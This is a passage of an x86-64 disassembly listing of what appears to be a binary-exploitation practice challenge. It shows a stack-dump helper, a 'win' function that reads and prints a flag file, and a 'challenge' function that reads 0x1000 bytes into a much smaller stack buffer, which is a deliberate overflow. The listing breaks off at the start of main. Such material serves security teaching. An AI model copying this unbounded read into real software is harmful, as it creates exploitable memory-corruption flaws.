  4012c2:       48 8d 15 a0 1d 00 00    lea    rdx,[rip+0x1da0]        # 403069 <_IO_stdin_used+0x69>
  4012c9:       48 8d 35 a6 1d 00 00    lea    rsi,[rip+0x1da6]        # 403076 <_IO_stdin_used+0x76>
  4012d0:       48 8d 3d ae 1d 00 00    lea    rdi,[rip+0x1dae]        # 403085 <_IO_stdin_used+0x85>
  4012d7:       b8 00 00 00 00          mov    eax,0x0
  4012dc:       e8 5f fe ff ff          call   401140 <printf@plt>
  4012e1:       48 8d 3d 20 1d 00 00    lea    rdi,[rip+0x1d20]        # 403008 <_IO_stdin_used+0x8>
  4012e8:       e8 23 fe ff ff          call   401110 <puts@plt>
  4012ed:       48 c7 05 70 3e 00 00    mov    QWORD PTR [rip+0x3e70],0x0        # 405168 <si_>
  4012f4:       00 00 00 00
  4012f8:       e9 73 01 00 00          jmp    401470 <DUMP_STACK+0x1da>
  4012fd:       48 8b 05 64 3e 00 00    mov    rax,QWORD PTR [rip+0x3e64]        # 405168 <si_>
  401304:       48 8d 14 c5 00 00 00    lea    rdx,[rax*8+0x0]
  40130b:       00
  40130c:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  401310:       48 01 d0                add    rax,rdx
  401313:       4c 8b 18                mov    r11,QWORD PTR [rax]
  401316:       48 8b 05 4b 3e 00 00    mov    rax,QWORD PTR [rip+0x3e4b]        # 405168 <si_>
  40131d:       48 8d 14 c5 00 00 00    lea    rdx,[rax*8+0x0]
  401324:       00
  401325:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  401329:       48 01 d0                add    rax,rdx
  40132c:       48 83 c0 07             add    rax,0x7
  401330:       0f b6 00                movzx  eax,BYTE PTR [rax]
  401333:       44 0f b6 d0             movzx  r10d,al
  401337:       48 8b 05 2a 3e 00 00    mov    rax,QWORD PTR [rip+0x3e2a]        # 405168 <si_>
  40133e:       48 8d 14 c5 00 00 00    lea    rdx,[rax*8+0x0]
  401345:       00
  401346:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  40134a:       48 01 d0                add    rax,rdx
  40134d:       48 83 c0 06             add    rax,0x6
  401351:       0f b6 00                movzx  eax,BYTE PTR [rax]
  401354:       44 0f b6 c8             movzx  r9d,al
  401358:       48 8b 05 09 3e 00 00    mov    rax,QWORD PTR [rip+0x3e09]        # 405168 <si_>
  40135f:       48 8d 14 c5 00 00 00    lea    rdx,[rax*8+0x0]
  401366:       00
  401367:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  40136b:       48 01 d0                add    rax,rdx
  40136e:       48 83 c0 05             add    rax,0x5
  401372:       0f b6 00                movzx  eax,BYTE PTR [rax]
  401375:       44 0f b6 c0             movzx  r8d,al
  401379:       48 8b 05 e8 3d 00 00    mov    rax,QWORD PTR [rip+0x3de8]        # 405168 <si_>
  401380:       48 8d 14 c5 00 00 00    lea    rdx,[rax*8+0x0]
  401387:       00
  401388:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  40138c:       48 01 d0                add    rax,rdx
  40138f:       48 83 c0 04             add    rax,0x4
  401393:       0f b6 00                movzx  eax,BYTE PTR [rax]
  401396:       0f b6 f8                movzx  edi,al
  401399:       48 8b 05 c8 3d 00 00    mov    rax,QWORD PTR [rip+0x3dc8]        # 405168 <si_>
  4013a0:       48 8d 14 c5 00 00 00    lea    rdx,[rax*8+0x0]
  4013a7:       00
  4013a8:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  4013ac:       48 01 d0                add    rax,rdx
  4013af:       48 83 c0 03             add    rax,0x3
  4013b3:       0f b6 00                movzx  eax,BYTE PTR [rax]
  4013b6:       0f b6 c8                movzx  ecx,al
  4013b9:       48 8b 05 a8 3d 00 00    mov    rax,QWORD PTR [rip+0x3da8]        # 405168 <si_>
  4013c0:       48 8d 14 c5 00 00 00    lea    rdx,[rax*8+0x0]
  4013c7:       00
  4013c8:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  4013cc:       48 01 d0                add    rax,rdx
  4013cf:       48 83 c0 02             add    rax,0x2
  4013d3:       0f b6 00                movzx  eax,BYTE PTR [rax]
  4013d6:       44 0f b6 e0             movzx  r12d,al
  4013da:       48 8b 05 87 3d 00 00    mov    rax,QWORD PTR [rip+0x3d87]        # 405168 <si_>
  4013e1:       48 8d 14 c5 00 00 00    lea    rdx,[rax*8+0x0]
  4013e8:       00
  4013e9:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  4013ed:       48 01 d0                add    rax,rdx
  4013f0:       48 83 c0 01             add    rax,0x1
  4013f4:       0f b6 00                movzx  eax,BYTE PTR [rax]
  4013f7:       0f b6 d8                movzx  ebx,al
  4013fa:       48 8b 05 67 3d 00 00    mov    rax,QWORD PTR [rip+0x3d67]        # 405168 <si_>
  401401:       48 8d 14 c5 00 00 00    lea    rdx,[rax*8+0x0]
  401408:       00
  401409:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]
  40140d:       48 01 d0                add    rax,rdx
  401410:       0f b6 00                movzx  eax,BYTE PTR [rax]
  401413:       0f b6 c0                movzx  eax,al
  401416:       48 8b 15 4b 3d 00 00    mov    rdx,QWORD PTR [rip+0x3d4b]        # 405168 <si_>
  40141d:       48 c1 e2 03             shl    rdx,0x3
  401421:       48 8b 35 40 3d 00 00    mov    rsi,QWORD PTR [rip+0x3d40]        # 405168 <si_>
  401428:       4c 8d 2c f5 00 00 00    lea    r13,[rsi*8+0x0]
  40142f:       00
  401430:       48 8b 75 d8             mov    rsi,QWORD PTR [rbp-0x28]
  401434:       4c 01 ee                add    rsi,r13
  401437:       41 53                   push   r11
  401439:       41 52                   push   r10
  40143b:       41 51                   push   r9
  40143d:       41 50                   push   r8
  40143f:       57                      push   rdi
  401440:       51                      push   rcx
  401441:       45 89 e1                mov    r9d,r12d
  401444:       41 89 d8                mov    r8d,ebx
  401447:       89 c1                   mov    ecx,eax
  401449:       48 8d 3d 50 1c 00 00    lea    rdi,[rip+0x1c50]        # 4030a0 <_IO_stdin_used+0xa0>
  401450:       b8 00 00 00 00          mov    eax,0x0
  401455:       e8 e6 fc ff ff          call   401140 <printf@plt>
  40145a:       48 83 c4 30             add    rsp,0x30
  40145e:       48 8b 05 03 3d 00 00    mov    rax,QWORD PTR [rip+0x3d03]        # 405168 <si_>
  401465:       48 83 c0 01             add    rax,0x1
  401469:       48 89 05 f8 3c 00 00    mov    QWORD PTR [rip+0x3cf8],rax        # 405168 <si_>
  401470:       48 8b 05 f1 3c 00 00    mov    rax,QWORD PTR [rip+0x3cf1]        # 405168 <si_>
  401477:       48 39 45 d0             cmp    QWORD PTR [rbp-0x30],rax
  40147b:       0f 87 7c fe ff ff       ja     4012fd <DUMP_STACK+0x67>
  401481:       48 8d 3d 80 1b 00 00    lea    rdi,[rip+0x1b80]        # 403008 <_IO_stdin_used+0x8>
  401488:       e8 83 fc ff ff          call   401110 <puts@plt>
  40148d:       90                      nop
  40148e:       48 8d 65 e8             lea    rsp,[rbp-0x18]
  401492:       5b                      pop    rbx
  401493:       41 5c                   pop    r12
  401495:       41 5d                   pop    r13
  401497:       5d                      pop    rbp
  401498:       c3                      ret

0000000000401499 <bin_padding>:
  401499:       f3 0f 1e fa             endbr64
  40149d:       55                      push   rbp
  40149e:       48 89 e5                mov    rbp,rsp
  4014a1:       90                      nop
 // ... a large amount of useless padding is here

0000000000402202 <win>:
  402202:       f3 0f 1e fa             endbr64
  402206:       55                      push   rbp
  402207:       48 89 e5                mov    rbp,rsp
  40220a:       48 8d 3d df 0e 00 00    lea    rdi,[rip+0xedf]        # 4030f0 <_IO_stdin_used+0xf0>
  402211:       e8 fa ee ff ff          call   401110 <puts@plt>
  402216:       be 00 00 00 00          mov    esi,0x0
  40221b:       48 8d 3d ea 0e 00 00    lea    rdi,[rip+0xeea]        # 40310c <_IO_stdin_used+0x10c>
  402222:       b8 00 00 00 00          mov    eax,0x0
  402227:       e8 54 ef ff ff          call   401180 <open@plt>
  40222c:       89 05 0e 2e 00 00       mov    DWORD PTR [rip+0x2e0e],eax        # 405040 <flag_fd.5714>
  402232:       8b 05 08 2e 00 00       mov    eax,DWORD PTR [rip+0x2e08]        # 405040 <flag_fd.5714>
  402238:       85 c0                   test   eax,eax
  40223a:       79 4d                   jns    402289 <win+0x87>
  40223c:       e8 bf ee ff ff          call   401100 <__errno_location@plt>
  402241:       8b 00                   mov    eax,DWORD PTR [rax]
  402243:       89 c7                   mov    edi,eax
  402245:       e8 56 ef ff ff          call   4011a0 <strerror@plt>
  40224a:       48 89 c6                mov    rsi,rax
  40224d:       48 8d 3d c4 0e 00 00    lea    rdi,[rip+0xec4]        # 403118 <_IO_stdin_used+0x118>
  402254:       b8 00 00 00 00          mov    eax,0x0
  402259:       e8 e2 ee ff ff          call   401140 <printf@plt>
  40225e:       e8 ed ee ff ff          call   401150 <geteuid@plt>
  402263:       85 c0                   test   eax,eax
  402265:       74 18                   je     40227f <win+0x7d>
  402267:       48 8d 3d da 0e 00 00    lea    rdi,[rip+0xeda]        # 403148 <_IO_stdin_used+0x148>
  40226e:       e8 9d ee ff ff          call   401110 <puts@plt>
  402273:       48 8d 3d f6 0e 00 00    lea    rdi,[rip+0xef6]        # 403170 <_IO_stdin_used+0x170>
  40227a:       e8 91 ee ff ff          call   401110 <puts@plt>
  40227f:       bf ff ff ff ff          mov    edi,0xffffffff
  402284:       e8 07 ef ff ff          call   401190 <exit@plt>
  402289:       8b 05 b1 2d 00 00       mov    eax,DWORD PTR [rip+0x2db1]        # 405040 <flag_fd.5714>
  40228f:       ba 00 01 00 00          mov    edx,0x100
  402294:       48 8d 35 c5 2d 00 00    lea    rsi,[rip+0x2dc5]        # 405060 <flag.5713>
  40229b:       89 c7                   mov    edi,eax
  40229d:       e8 be ee ff ff          call   401160 <read@plt>
  4022a2:       89 05 b8 2e 00 00       mov    DWORD PTR [rip+0x2eb8],eax        # 405160 <flag_length.5715>
  4022a8:       8b 05 b2 2e 00 00       mov    eax,DWORD PTR [rip+0x2eb2]        # 405160 <flag_length.5715>
  4022ae:       85 c0                   test   eax,eax
  4022b0:       7f 2c                   jg     4022de <win+0xdc>
  4022b2:       e8 49 ee ff ff          call   401100 <__errno_location@plt>
  4022b7:       8b 00                   mov    eax,DWORD PTR [rax]
  4022b9:       89 c7                   mov    edi,eax
  4022bb:       e8 e0 ee ff ff          call   4011a0 <strerror@plt>
  4022c0:       48 89 c6                mov    rsi,rax
  4022c3:       48 8d 3d fe 0e 00 00    lea    rdi,[rip+0xefe]        # 4031c8 <_IO_stdin_used+0x1c8>
  4022ca:       b8 00 00 00 00          mov    eax,0x0
  4022cf:       e8 6c ee ff ff          call   401140 <printf@plt>
  4022d4:       bf ff ff ff ff          mov    edi,0xffffffff
  4022d9:       e8 b2 ee ff ff          call   401190 <exit@plt>
  4022de:       8b 05 7c 2e 00 00       mov    eax,DWORD PTR [rip+0x2e7c]        # 405160 <flag_length.5715>
  4022e4:       48 98                   cdqe
  4022e6:       48 89 c2                mov    rdx,rax
  4022e9:       48 8d 35 70 2d 00 00    lea    rsi,[rip+0x2d70]        # 405060 <flag.5713>
  4022f0:       bf 01 00 00 00          mov    edi,0x1
  4022f5:       e8 26 ee ff ff          call   401120 <write@plt>
  4022fa:       48 8d 3d f1 0e 00 00    lea    rdi,[rip+0xef1]        # 4031f2 <_IO_stdin_used+0x1f2>
  402301:       e8 0a ee ff ff          call   401110 <puts@plt>
  402306:       90                      nop
  402307:       5d                      pop    rbp
  402308:       c3                      ret

0000000000402309 <challenge>:
  402309:       f3 0f 1e fa             endbr64
  40230d:       55                      push   rbp
  40230e:       48 89 e5                mov    rbp,rsp
  402311:       48 83 c4 80             add    rsp,0xffffffffffffff80
  402315:       89 7d 9c                mov    DWORD PTR [rbp-0x64],edi
  402318:       48 89 75 90             mov    QWORD PTR [rbp-0x70],rsi
  40231c:       48 89 55 88             mov    QWORD PTR [rbp-0x78],rdx
  402320:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  402327:       00 00
  402329:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  40232d:       31 c0                   xor    eax,eax
  40232f:       48 c7 45 b0 00 00 00    mov    QWORD PTR [rbp-0x50],0x0
  402336:       00
  402337:       48 c7 45 b8 00 00 00    mov    QWORD PTR [rbp-0x48],0x0
  40233e:       00
  40233f:       48 c7 45 c0 00 00 00    mov    QWORD PTR [rbp-0x40],0x0
  402346:       00
  402347:       48 c7 45 c8 00 00 00    mov    QWORD PTR [rbp-0x38],0x0
  40234e:       00
  40234f:       48 c7 45 d0 00 00 00    mov    QWORD PTR [rbp-0x30],0x0
  402356:       00
  402357:       48 c7 45 d8 00 00 00    mov    QWORD PTR [rbp-0x28],0x0
  40235e:       00
  40235f:       48 c7 45 e0 00 00 00    mov    QWORD PTR [rbp-0x20],0x0
  402366:       00
  402367:       48 c7 45 e8 00 00 00    mov    QWORD PTR [rbp-0x18],0x0
  40236e:       00
  40236f:       48 c7 45 a8 00 00 00    mov    QWORD PTR [rbp-0x58],0x0
  402376:       00
  402377:       48 8d 3d 7a 0e 00 00    lea    rdi,[rip+0xe7a]        # 4031f8 <_IO_stdin_used+0x1f8>
  40237e:       e8 8d ed ff ff          call   401110 <puts@plt>
  402383:       48 89 e0                mov    rax,rsp
  402386:       48 89 05 0b 2e 00 00    mov    QWORD PTR [rip+0x2e0b],rax        # 405198 <sp_>
  40238d:       48 89 e8                mov    rax,rbp
  402390:       48 89 05 e1 2d 00 00    mov    QWORD PTR [rip+0x2de1],rax        # 405178 <bp_>
  402397:       48 8b 15 da 2d 00 00    mov    rdx,QWORD PTR [rip+0x2dda]        # 405178 <bp_>
  40239e:       48 8b 05 f3 2d 00 00    mov    rax,QWORD PTR [rip+0x2df3]        # 405198 <sp_>
  4023a5:       48 29 c2                sub    rdx,rax
  4023a8:       48 89 d0                mov    rax,rdx
  4023ab:       48 c1 e8 03             shr    rax,0x3
  4023af:       48 83 c0 02             add    rax,0x2
  4023b3:       48 89 05 ce 2d 00 00    mov    QWORD PTR [rip+0x2dce],rax        # 405188 <sz_>
  4023ba:       48 8b 05 b7 2d 00 00    mov    rax,QWORD PTR [rip+0x2db7]        # 405178 <bp_>
  4023c1:       48 83 c0 08             add    rax,0x8
  4023c5:       48 89 05 c4 2d 00 00    mov    QWORD PTR [rip+0x2dc4],rax        # 405190 <rp_>
  4023cc:       48 8d 3d 5d 0e 00 00    lea    rdi,[rip+0xe5d]        # 403230 <_IO_stdin_used+0x230>
  4023d3:       e8 38 ed ff ff          call   401110 <puts@plt>
  4023d8:       48 8b 15 a9 2d 00 00    mov    rdx,QWORD PTR [rip+0x2da9]        # 405188 <sz_>
  4023df:       48 8b 05 b2 2d 00 00    mov    rax,QWORD PTR [rip+0x2db2]        # 405198 <sp_>
  4023e6:       48 89 d6                mov    rsi,rdx
  4023e9:       48 89 c7                mov    rdi,rax
  4023ec:       e8 a5 ee ff ff          call   401296 <DUMP_STACK>
  4023f1:       48 8b 15 80 2d 00 00    mov    rdx,QWORD PTR [rip+0x2d80]        # 405178 <bp_>
  4023f8:       48 8b 05 99 2d 00 00    mov    rax,QWORD PTR [rip+0x2d99]        # 405198 <sp_>
  4023ff:       48 89 c6                mov    rsi,rax
  402402:       48 8d 3d 6f 0e 00 00    lea    rdi,[rip+0xe6f]        # 403278 <_IO_stdin_used+0x278>
  402409:       b8 00 00 00 00          mov    eax,0x0
  40240e:       e8 2d ed ff ff          call   401140 <printf@plt>
  402413:       48 8b 05 6e 2d 00 00    mov    rax,QWORD PTR [rip+0x2d6e]        # 405188 <sz_>
  40241a:       48 89 c6                mov    rsi,rax
  40241d:       48 8d 3d 9c 0e 00 00    lea    rdi,[rip+0xe9c]        # 4032c0 <_IO_stdin_used+0x2c0>
  402424:       b8 00 00 00 00          mov    eax,0x0
  402429:       e8 12 ed ff ff          call   401140 <printf@plt>
  40242e:       48 8d 3d d3 0e 00 00    lea    rdi,[rip+0xed3]        # 403308 <_IO_stdin_used+0x308>
  402435:       e8 d6 ec ff ff          call   401110 <puts@plt>
  40243a:       48 8b 05 47 2d 00 00    mov    rax,QWORD PTR [rip+0x2d47]        # 405188 <sz_>
  402441:       48 c1 e0 03             shl    rax,0x3
  402445:       48 89 c6                mov    rsi,rax
  402448:       48 8d 3d fe 0e 00 00    lea    rdi,[rip+0xefe]        # 40334d <_IO_stdin_used+0x34d>
  40244f:       b8 00 00 00 00          mov    eax,0x0
  402454:       e8 e7 ec ff ff          call   401140 <printf@plt>
  402459:       48 8d 45 b0             lea    rax,[rbp-0x50]
  40245d:       48 89 c6                mov    rsi,rax
  402460:       48 8d 3d 01 0f 00 00    lea    rdi,[rip+0xf01]        # 403368 <_IO_stdin_used+0x368>
  402467:       b8 00 00 00 00          mov    eax,0x0
  40246c:       e8 cf ec ff ff          call   401140 <printf@plt>
  402471:       48 8d 3d 38 0f 00 00    lea    rdi,[rip+0xf38]        # 4033b0 <_IO_stdin_used+0x3b0>
  402478:       e8 93 ec ff ff          call   401110 <puts@plt>
  40247d:       48 8d 3d 7c 0f 00 00    lea    rdi,[rip+0xf7c]        # 403400 <_IO_stdin_used+0x400>
  402484:       e8 87 ec ff ff          call   401110 <puts@plt>
  402489:       be 3a 00 00 00          mov    esi,0x3a
  40248e:       48 8d 3d 9b 0f 00 00    lea    rdi,[rip+0xf9b]        # 403430 <_IO_stdin_used+0x430>
  402495:       b8 00 00 00 00          mov    eax,0x0
  40249a:       e8 a1 ec ff ff          call   401140 <printf@plt>
  40249f:       48 8d 3d e2 0f 00 00    lea    rdi,[rip+0xfe2]        # 403488 <_IO_stdin_used+0x488>
  4024a6:       e8 65 ec ff ff          call   401110 <puts@plt>
  4024ab:       48 8d 3d 0e 10 00 00    lea    rdi,[rip+0x100e]        # 4034c0 <_IO_stdin_used+0x4c0>
  4024b2:       e8 59 ec ff ff          call   401110 <puts@plt>
  4024b7:       48 8d 3d 32 10 00 00    lea    rdi,[rip+0x1032]        # 4034f0 <_IO_stdin_used+0x4f0>
  4024be:       e8 4d ec ff ff          call   401110 <puts@plt>
  4024c3:       48 8d 3d 56 10 00 00    lea    rdi,[rip+0x1056]        # 403520 <_IO_stdin_used+0x520>
  4024ca:       e8 41 ec ff ff          call   401110 <puts@plt>
  4024cf:       48 8d 3d 92 10 00 00    lea    rdi,[rip+0x1092]        # 403568 <_IO_stdin_used+0x568>
  4024d6:       e8 35 ec ff ff          call   401110 <puts@plt>
  4024db:       48 8d 45 b0             lea    rax,[rbp-0x50]
  4024df:       48 83 c0 3c             add    rax,0x3c
  4024e3:       ba 3c 00 00 00          mov    edx,0x3c
  4024e8:       48 89 c6                mov    rsi,rax
  4024eb:       48 8d 3d be 10 00 00    lea    rdi,[rip+0x10be]        # 4035b0 <_IO_stdin_used+0x5b0>
  4024f2:       b8 00 00 00 00          mov    eax,0x0
  4024f7:       e8 44 ec ff ff          call   401140 <printf@plt>
  4024fc:       48 8d 3d 05 11 00 00    lea    rdi,[rip+0x1105]        # 403608 <_IO_stdin_used+0x608>
  402503:       e8 08 ec ff ff          call   401110 <puts@plt>
  402508:       48 8d 3d 59 11 00 00    lea    rdi,[rip+0x1159]        # 403668 <_IO_stdin_used+0x668>
  40250f:       e8 fc eb ff ff          call   401110 <puts@plt>
  402514:       48 8d 3d 95 11 00 00    lea    rdi,[rip+0x1195]        # 4036b0 <_IO_stdin_used+0x6b0>
  40251b:       e8 f0 eb ff ff          call   401110 <puts@plt>
  402520:       48 8d 3d d1 11 00 00    lea    rdi,[rip+0x11d1]        # 4036f8 <_IO_stdin_used+0x6f8>
  402527:       e8 e4 eb ff ff          call   401110 <puts@plt>
  40252c:       48 8d 3d 0d 12 00 00    lea    rdi,[rip+0x120d]        # 403740 <_IO_stdin_used+0x740>
  402533:       e8 d8 eb ff ff          call   401110 <puts@plt>
  402538:       48 8b 05 39 2c 00 00    mov    rax,QWORD PTR [rip+0x2c39]        # 405178 <bp_>
  40253f:       48 89 05 2a 2c 00 00    mov    QWORD PTR [rip+0x2c2a],rax        # 405170 <cp_>
  402546:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  40254d:       00 00
  40254f:       48 89 05 2a 2c 00 00    mov    QWORD PTR [rip+0x2c2a],rax        # 405180 <cv_>
  402556:       eb 12                   jmp    40256a <challenge+0x261>
  402558:       48 8b 05 11 2c 00 00    mov    rax,QWORD PTR [rip+0x2c11]        # 405170 <cp_>
  40255f:       48 83 e8 08             sub    rax,0x8
  402563:       48 89 05 06 2c 00 00    mov    QWORD PTR [rip+0x2c06],rax        # 405170 <cp_>
  40256a:       48 8b 05 ff 2b 00 00    mov    rax,QWORD PTR [rip+0x2bff]        # 405170 <cp_>
  402571:       48 8b 10                mov    rdx,QWORD PTR [rax]
  402574:       48 8b 05 05 2c 00 00    mov    rax,QWORD PTR [rip+0x2c05]        # 405180 <cv_>
  40257b:       48 39 c2                cmp    rdx,rax
  40257e:       75 d8                   jne    402558 <challenge+0x24f>
  402580:       48 c7 45 a8 00 10 00    mov    QWORD PTR [rbp-0x58],0x1000
  402587:       00
  402588:       48 8b 45 a8             mov    rax,QWORD PTR [rbp-0x58]
  40258c:       48 89 c6                mov    rsi,rax
  40258f:       48 8d 3d fa 11 00 00    lea    rdi,[rip+0x11fa]        # 403790 <_IO_stdin_used+0x790>
  402596:       b8 00 00 00 00          mov    eax,0x0
  40259b:       e8 a0 eb ff ff          call   401140 <printf@plt>
  4025a0:       48 8d 45 b0             lea    rax,[rbp-0x50]
  4025a4:       48 89 c6                mov    rsi,rax
  4025a7:       48 8d 3d 12 12 00 00    lea    rdi,[rip+0x1212]        # 4037c0 <_IO_stdin_used+0x7c0>
  4025ae:       b8 00 00 00 00          mov    eax,0x0
  4025b3:       e8 88 eb ff ff          call   401140 <printf@plt>
  4025b8:       48 8b 45 a8             mov    rax,QWORD PTR [rbp-0x58]
  4025bc:       48 8d 50 c6             lea    rdx,[rax-0x3a]
  4025c0:       48 8d 4d b0             lea    rcx,[rbp-0x50]
  4025c4:       48 8b 45 a8             mov    rax,QWORD PTR [rbp-0x58]
  4025c8:       48 01 c8                add    rax,rcx
  4025cb:       48 89 c6                mov    rsi,rax
  4025ce:       48 8d 3d 33 12 00 00    lea    rdi,[rip+0x1233]        # 403808 <_IO_stdin_used+0x808>
  4025d5:       b8 00 00 00 00          mov    eax,0x0
  4025da:       e8 61 eb ff ff          call   401140 <printf@plt>
  4025df:       48 8b 45 a8             mov    rax,QWORD PTR [rbp-0x58]
  4025e3:       48 89 c6                mov    rsi,rax
  4025e6:       48 8d 3d 73 12 00 00    lea    rdi,[rip+0x1273]        # 403860 <_IO_stdin_used+0x860>
  4025ed:       b8 00 00 00 00          mov    eax,0x0
  4025f2:       e8 49 eb ff ff          call   401140 <printf@plt>
  4025f7:       48 8b 55 a8             mov    rdx,QWORD PTR [rbp-0x58]
  4025fb:       48 8d 45 b0             lea    rax,[rbp-0x50]
  4025ff:       48 89 c6                mov    rsi,rax
  402602:       bf 00 00 00 00          mov    edi,0x0
  402607:       e8 54 eb ff ff          call   401160 <read@plt>
  40260c:       89 45 a4                mov    DWORD PTR [rbp-0x5c],eax
  40260f:       83 7d a4 00             cmp    DWORD PTR [rbp-0x5c],0x0
  402613:       79 2c                   jns    402641 <challenge+0x338>
  402615:       e8 e6 ea ff ff          call   401100 <__errno_location@plt>
  40261a:       8b 00                   mov    eax,DWORD PTR [rax]
  40261c:       89 c7                   mov    edi,eax
  40261e:       e8 7d eb ff ff          call   4011a0 <strerror@plt>
  402623:       48 89 c6                mov    rsi,rax
  402626:       48 8d 3d 5b 12 00 00    lea    rdi,[rip+0x125b]        # 403888 <_IO_stdin_used+0x888>
  40262d:       b8 00 00 00 00          mov    eax,0x0
  402632:       e8 09 eb ff ff          call   401140 <printf@plt>
  402637:       bf 01 00 00 00          mov    edi,0x1
  40263c:       e8 4f eb ff ff          call   401190 <exit@plt>
  402641:       8b 45 a4                mov    eax,DWORD PTR [rbp-0x5c]
  402644:       89 c6                   mov    esi,eax
  402646:       48 8d 3d 5f 12 00 00    lea    rdi,[rip+0x125f]        # 4038ac <_IO_stdin_used+0x8ac>
  40264d:       b8 00 00 00 00          mov    eax,0x0
  402652:       e8 e9 ea ff ff          call   401140 <printf@plt>
  402657:       48 8d 3d 62 12 00 00    lea    rdi,[rip+0x1262]        # 4038c0 <_IO_stdin_used+0x8c0>
  40265e:       e8 ad ea ff ff          call   401110 <puts@plt>
  402663:       48 8b 15 1e 2b 00 00    mov    rdx,QWORD PTR [rip+0x2b1e]        # 405188 <sz_>
  40266a:       48 8b 05 27 2b 00 00    mov    rax,QWORD PTR [rip+0x2b27]        # 405198 <sp_>
  402671:       48 89 d6                mov    rsi,rdx
  402674:       48 89 c7                mov    rdi,rax
  402677:       e8 1a ec ff ff          call   401296 <DUMP_STACK>
  40267c:       48 8d 3d 66 12 00 00    lea    rdi,[rip+0x1266]        # 4038e9 <_IO_stdin_used+0x8e9>
  402683:       e8 88 ea ff ff          call   401110 <puts@plt>
  402688:       48 8d 45 b0             lea    rax,[rbp-0x50]
  40268c:       48 89 c6                mov    rsi,rax
  40268f:       48 8d 3d 72 12 00 00    lea    rdi,[rip+0x1272]        # 403908 <_IO_stdin_used+0x908>
  402696:       b8 00 00 00 00          mov    eax,0x0
  40269b:       e8 a0 ea ff ff          call   401140 <printf@plt>
  4026a0:       48 8b 05 d1 2a 00 00    mov    rax,QWORD PTR [rip+0x2ad1]        # 405178 <bp_>
  4026a7:       48 89 c6                mov    rsi,rax
  4026aa:       48 8d 3d 7f 12 00 00    lea    rdi,[rip+0x127f]        # 403930 <_IO_stdin_used+0x930>
  4026b1:       b8 00 00 00 00          mov    eax,0x0
  4026b6:       e8 85 ea ff ff          call   401140 <printf@plt>
  4026bb:       48 8b 05 ce 2a 00 00    mov    rax,QWORD PTR [rip+0x2ace]        # 405190 <rp_>
  4026c2:       48 89 c6                mov    rsi,rax
  4026c5:       48 8d 3d 94 12 00 00    lea    rdi,[rip+0x1294]        # 403960 <_IO_stdin_used+0x960>
  4026cc:       b8 00 00 00 00          mov    eax,0x0
  4026d1:       e8 6a ea ff ff          call   401140 <printf@plt>
  4026d6:       48 8b 05 b3 2a 00 00    mov    rax,QWORD PTR [rip+0x2ab3]        # 405190 <rp_>
  4026dd:       48 8b 00                mov    rax,QWORD PTR [rax]
  4026e0:       48 89 c6                mov    rsi,rax
  4026e3:       48 8d 3d b6 12 00 00    lea    rdi,[rip+0x12b6]        # 4039a0 <_IO_stdin_used+0x9a0>
  4026ea:       b8 00 00 00 00          mov    eax,0x0
  4026ef:       e8 4c ea ff ff          call   401140 <printf@plt>
  4026f4:       48 8b 05 75 2a 00 00    mov    rax,QWORD PTR [rip+0x2a75]        # 405170 <cp_>
  4026fb:       48 89 c6                mov    rsi,rax
  4026fe:       48 8d 3d d3 12 00 00    lea    rdi,[rip+0x12d3]        # 4039d8 <_IO_stdin_used+0x9d8>
  402705:       b8 00 00 00 00          mov    eax,0x0
  40270a:       e8 31 ea ff ff          call   401140 <printf@plt>
  40270f:       48 8b 05 5a 2a 00 00    mov    rax,QWORD PTR [rip+0x2a5a]        # 405170 <cp_>
  402716:       48 8b 00                mov    rax,QWORD PTR [rax]
  402719:       48 89 c6                mov    rsi,rax
  40271c:       48 8d 3d d5 12 00 00    lea    rdi,[rip+0x12d5]        # 4039f8 <_IO_stdin_used+0x9f8>
  402723:       b8 00 00 00 00          mov    eax,0x0
  402728:       e8 13 ea ff ff          call   401140 <printf@plt>
  40272d:       48 8d 45 b0             lea    rax,[rbp-0x50]
  402731:       48 83 c0 3c             add    rax,0x3c
  402735:       48 89 c6                mov    rsi,rax
  402738:       48 8d 3d d9 12 00 00    lea    rdi,[rip+0x12d9]        # 403a18 <_IO_stdin_used+0xa18>
  40273f:       b8 00 00 00 00          mov    eax,0x0
  402744:       e8 f7 e9 ff ff          call   401140 <printf@plt>
  402749:       8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]
  40274c:       89 c6                   mov    esi,eax
  40274e:       48 8d 3d f3 12 00 00    lea    rdi,[rip+0x12f3]        # 403a48 <_IO_stdin_used+0xa48>
  402755:       b8 00 00 00 00          mov    eax,0x0
  40275a:       e8 e1 e9 ff ff          call   401140 <printf@plt>
  40275f:       bf 0a 00 00 00          mov    edi,0xa
  402764:       e8 87 e9 ff ff          call   4010f0 <putchar@plt>
  402769:       8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]
  40276c:       85 c0                   test   eax,eax
  40276e:       74 0a                   je     40277a <challenge+0x471>
  402770:       b8 00 00 00 00          mov    eax,0x0
  402775:       e8 88 fa ff ff          call   402202 <win>
  40277a:       48 8d 3d f1 12 00 00    lea    rdi,[rip+0x12f1]        # 403a72 <_IO_stdin_used+0xa72>
  402781:       e8 8a e9 ff ff          call   401110 <puts@plt>
  402786:       b8 00 00 00 00          mov    eax,0x0
  40278b:       48 8b 4d f8             mov    rcx,QWORD PTR [rbp-0x8]
  40278f:       64 48 33 0c 25 28 00    xor    rcx,QWORD PTR fs:0x28
  402796:       00 00
  402798:       74 05                   je     40279f <challenge+0x496>
  40279a:       e8 91 e9 ff ff          call   401130 <__stack_chk_fail@plt>
  40279f:       c9                      leave
  4027a0:       c3                      ret

00000000004027a1 <main>:
  4027a1:       f3 0f 1e fa             endbr64
  4027a5:       55                      push   rbp
  4027a6:       48 89 e5                mov    rbp,rsp
  4027a9:       48 81 ec 00 10 00 00    sub    rsp,0x1000
  4027b0:       48 83 0c 24 00          or     QWORD PTR [rsp],0x0
  4027b5:       48 83 ec 30             sub    rsp,0x30
